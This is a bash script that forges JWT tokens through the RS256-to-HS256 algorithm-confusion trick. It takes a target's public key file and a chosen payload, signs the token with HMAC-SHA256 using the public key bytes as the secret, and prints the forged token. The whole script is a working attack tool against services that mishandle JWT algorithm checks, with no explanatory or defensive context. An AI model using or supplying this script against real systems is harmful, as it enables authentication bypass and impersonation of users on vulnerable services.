#!/bin/bash


: '
first param: public.pem
second param: JWT payload
'

if [[ $# -eq 0 ]] ; then
    echo "usage: $0 <public.pem> <JWT payload>"
    exit 0
fi

header="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
payload=$2
signature=""

hexkey=$(cat $1 | xxd -p | tr -d "\\n")


stdin=$(echo -n "$header.$payload" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$hexkey | cut -d ' ' -f2)

signature=$(python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$stdin')).replace('=','')\")")

TOKEN="$header.$payload.$signature"

echo "[+] generated token with HS256 alg: $TOKEN"